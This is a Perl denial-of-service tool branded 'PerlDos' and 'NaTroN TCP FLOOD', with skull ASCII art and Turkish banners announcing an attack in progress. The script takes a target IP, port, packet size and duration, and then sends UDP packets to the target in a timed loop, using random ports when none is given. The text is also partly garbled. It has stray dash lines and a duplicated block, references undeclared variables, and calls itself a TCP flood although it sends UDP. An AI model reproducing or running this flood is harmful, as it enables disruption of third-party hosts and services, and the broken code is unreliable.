#!/usr/bin/perl
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
##
# MBE Software - PerlDos*
##
use Socket;
use strict;
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print BOLD RED<<EOTEXT;


     
     
     
                   ...
                 ;::::;              
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'  *  * ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
EOTEXT
print "Developed by Burak Eyidoğan $ip " . ($port ? $port : "Attacking Succesful") . " With " .
  ($size ? "$size-Slammed" : "65500") . "Bots" .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;
print BOLD GREEN<<EOTEXT;

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                 ~ [+] NaTroN TCP FLOOD [+] ~	
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOTEXT

 print BOLD WHITE "            [+] Saldirdiginiz IP Adresi : $ip
            [+] Saldirdiginiz Port Adresi : " .

-
-
-
-

        ($port ? $port : "random") ." ".($time ? "= $time [+] Saniye" : "
            [+] Saldiriniz Suanda gerceklestiriliyor. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "= $time [+] Saniye" : "
            [+] Saldiriniz Suanda gerceklestiriliyor. ") . "\n";
        print   BOLD BLUE"            [+] Durdurmak için Ctrl-C\n" unless $time;
        print   BOLD GREEN"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" unless $time;


for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(999))+1;

  if(1 != $ipv6) {
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  } else {
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in6($pport, $iaddr));
  };
  usleep(1000 * $delay) if $delay;
}